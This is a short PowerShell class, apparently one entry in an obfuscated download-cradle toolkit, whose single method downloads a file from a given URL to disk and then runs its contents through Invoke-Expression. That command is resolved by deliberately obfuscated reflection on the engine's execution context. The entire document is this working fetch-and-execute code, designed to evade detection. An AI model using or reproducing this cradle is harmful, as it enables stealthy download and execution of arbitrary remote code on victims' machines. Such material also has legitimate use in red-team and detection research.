Class ObfDownloadFile11 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\5
        (New-Object Net.WebClient).DownloadFile($url,$path);&(GV E*Cont* -Value).(((GV E*Cont* -Value)|Get-Member)[6].Name).(((GV E*Cont* -Value).(((GV E*Cont* -Value)|Get-Member)[6].Name).PsObject.Methods|Where-Object{(Get-Item Variable:_).Value.Name-like'*md*t'}).Name).Invoke((GV E*Cont* -Value).(((GV E*Cont* -Value)|Get-Member)[6].Name).GetCommandName('*-Ex*n',$TRUE,1))(([Char[]](Get-Content $path -Encodi 3))-Join'')

    }

}